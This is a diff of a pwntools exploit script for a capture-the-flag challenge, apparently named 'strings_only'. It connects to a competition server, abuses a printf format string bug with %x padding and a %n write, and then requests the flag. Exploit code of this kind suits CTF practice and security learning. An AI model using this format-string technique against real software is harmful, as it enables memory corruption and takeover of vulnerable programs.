@@ -1,11 +1,15 @@
+#this is a printf vulnerability
+#we are attacking this specific statement
+#printf(strings[index]);
+#in case 3 in the source code 
+
 from pwn import *
 
-e = ELF("strings_only")
 context.terminal = ['tmux', 'splitw', '-h']
-# io = gdb.debug("./strings_only", '''b *main + 332
-#    c ''')
 
 io = remote("chal.competitivecyber.club", 8888 )
+
+print("This will take a while")
 
 #create string where we will drop our initial format string vulnerability to
 #leak the key address
@@ -49,6 +53,7 @@ strings = int(strings[1], 16)
 
 printer =  b"%" + str(int(strings/16)).encode() +  b"x."
 payload =  printer * 16  + b"%6$n"
+
 #time to write the payload
 io.sendlineafter(b'malloc', b'1')
 io.sendlineafter(b'Size', b'300')
@@ -76,4 +81,5 @@ io.sendlineafter(b'String', p32(0xcafebabe))
 
 #print flag
 io.sendlineafter(b'flag', b'5')
+print(io.recvall().decode())
 io.interactive()
